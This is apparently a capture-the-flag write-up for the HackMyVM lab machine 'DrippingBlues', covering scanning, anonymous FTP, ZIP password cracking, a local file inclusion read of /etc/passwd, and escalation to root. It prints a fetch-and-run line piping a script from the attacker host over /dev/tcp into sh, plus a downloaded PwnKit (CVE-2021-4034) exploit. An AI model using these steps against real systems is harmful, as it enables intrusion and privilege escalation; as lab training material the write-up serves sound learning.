---
layout: post
title: "HackMyVM - DrippingBlues"
date: 2021-09-23 23:00:00 +0100
categories: hmv
tag: ["LFI"]
---

Creator: [tasiyanci](https://hackmyvm.eu/profile/?user=tasiyanci)
Level: Easy
Release Date: 2021-09-20

## Scan

```bash
$ nmap -sC -sV -p- 192.168.1.10 
Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-23 23:25 WEST
Nmap scan report for 192.168.1.10
Host is up (0.00046s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxrwxrwx    1 0        0             471 Sep 19  2021 respectmydrip.zip [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.1.6
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 9e:bb:af:6f:7d:a7:9d:65:a1:b1:a1:be:91:cd:04:28 (RSA)
|   256 a3:d3:c0:b4:c5:f9:c0:6c:e5:47:64:fe:91:c5:cd:c0 (ECDSA)
|_  256 4c:84:da:5a:ff:04:b9:b5:5c:5a:be:21:b6:0e:45:73 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-robots.txt: 2 disallowed entries 
|_/dripisreal.txt /etc/dripispowerful.html
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.85 seconds
```

## Enumeration

### Web Files

http://192.168.1.10/robots.txt

```
User-agent: *
Disallow: /dripisreal.txt
Disallow: /etc/dripispowerful.html
```

http://192.168.1.10/dripisreal.txt

```
hello dear hacker wannabe,

go for this lyrics:

https://www.azlyrics.com/lyrics/youngthug/constantlyhating.html

count the n words and put them side by side then md5sum it

ie, hellohellohellohello >> md5sum hellohellohellohello

it's the password of ssh
```

### FTP Files

```bash
$ ftp 192.168.1.10     
Connected to 192.168.1.10.
220 (vsFTPd 3.0.3)
Name (192.168.1.10:adok): Anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||27829|)
150 Here comes the directory listing.
-rwxrwxrwx    1 0        0             471 Sep 19  2021 respectmydrip.zip
226 Directory send OK.
```

## Cracking ZIP

```bash
$ zip2john respectmydrip.zip > hash_respectmydrip
ver 2.0 respectmydrip.zip/respectmydrip.txt PKZIP Encr: cmplen=32, decmplen=20, crc=5C92F12B ts=96AB cs=5c92 type=0
ver 2.0 respectmydrip.zip/secret.zip is not encrypted, or stored with non-handled compression type
```

```bash
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash_respectmydrip 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
07******5        (respectmydrip.zip/respectmydrip.txt)     
1g 0:00:00:02 DONE (2021-09-23 23:33) 0.4524g/s 6301Kp/s 6301Kc/s 6301KC/s 072551..0713932315
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

```bash
$ unzip -P 07******5 respectmydrip.zip                                    
Archive:  respectmydrip.zip
 extracting: respectmydrip.txt       
  inflating: secret.zip              

$ ls
hash_respectmydrip  README.md  respectmydrip.txt  respectmydrip.zip  secret.zip

$ cat respectmydrip.txt 
just focus on "drip"         
```

## WFUZZ traversal path (/etc/dripispowerful.html) 

```java
wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hh 0 --filter "c=200 and l>8" http://192.168.1.10/index.php?FUZZ=/etc/passwd

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.1.10/index.php?FUZZ=/etc/passwd
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                              
=====================================================================

000172073:   200        57 L     107 W      3032 Ch     "drip"                                                                                               

Total time: 0
Processed Requests: 220560
Filtered Requests: 220559
Requests/sec.: 0
```

### LFI (/etc/passwd)

```
http://192.168.1.10/index.php?drip=/etc/passwd
```

```bash
...
thugger:x:1001:1001:,,,:/home/thugger:/bin/bash
...
<html> 
<body> driftingblues is hacked again so it's now called drippingblues. :D hahaha 
<br> by <br> travisscott & thugger 
</body> 
</html>
```

### User access

```
http://192.168.1.10/index.php?drip=/etc/dripispowerful.html
```

<img src="https://drive.google.com/uc?id=15myG02eRhyP6KGD0vv6NRHr3H1oaPLSL"/>

```html
</style> password is:
imdrippinbiatch </body> </html>
```

## Priviledge Escalation

### Transfer LINPEAS with NetCat

* Local 
```
sudo nc -q 5 -lvnp 8888 < linpeas.sh
```

* Remote

```
cat < /dev/tcp/192.168.1.6/8888 | sh
```

* Kernel Exploit

```bash
[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main
```

## ROOT - [CVE-2021-4034-1](https://github.com/berdav/CVE-2021-4034)

```
wget http://192.168.1.6:9000/PwnKit
```

```
thugger@drippingblues:/dev/shm$ ./PwnKit 
root@drippingblues:/dev/shm# id
uid=0(root) gid=0(root) groups=0(root),1001(thugger)
root@drippingblues:/dev/shm# cat /root/root.txt 
78CE377EF7F10FF0EDCA63DD60EE63B8
```
